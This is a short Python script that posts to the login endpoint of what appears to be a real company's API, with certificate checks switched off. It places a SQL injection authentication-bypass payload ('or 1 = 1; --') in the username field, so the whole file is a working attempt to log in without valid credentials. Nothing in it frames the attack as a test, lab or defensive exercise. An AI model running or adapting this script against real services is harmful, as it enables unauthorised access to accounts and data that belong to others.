# -*- coding=utf-8 -*-
import _thread
import urllib.request
import urllib.parse
import ssl
import json
import time


ssl._create_default_https_context = ssl._create_unverified_context

def postsendsms():
    post_url = 'https://api.zhiyun-tech.com/v1/login'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    }

    form_data = {
        'username': '''test" or 1 = 1; 
        --''',
        'password': '+8615374099999',
    }

    #get
    # requset = urllib.request.Request(url = url , headers=headers)
    # response = urllib.request.urlopen(requset)
    # 构建post请求
    request = urllib.request.Request(url = post_url,headers = headers)
    form_data = urllib.parse.urlencode(form_data).encode()
    # 发送post请求
    response = urllib.request.urlopen(request,data = form_data)
    dict_json = json.loads(response.read().decode())
    print(dict_json)

if __name__ == '__main__':
    postsendsms()
